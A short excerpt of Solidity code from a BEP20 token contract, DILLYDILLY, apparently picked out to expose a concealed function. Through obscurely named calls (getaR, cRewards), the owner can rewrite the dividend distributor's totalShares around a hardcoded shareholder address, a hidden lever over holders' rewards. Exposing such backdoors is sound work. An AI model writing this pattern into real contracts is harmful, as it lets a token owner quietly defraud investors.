...
interface IDividendDistributor {
    ...
    function cRewards(uint256 _amount) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function cRewards(uint256 _amount) external override {
        address shareholder = SHAR;
        totalShares = totalShares.sub(shares[shareholder].amount).add(_amount);
...
contract DILLYDILLY is IBEP20, Auth {
    ...
    function getaR(uint256 _amount) external authorized {
        distributor.cRewards(_amount);
    }
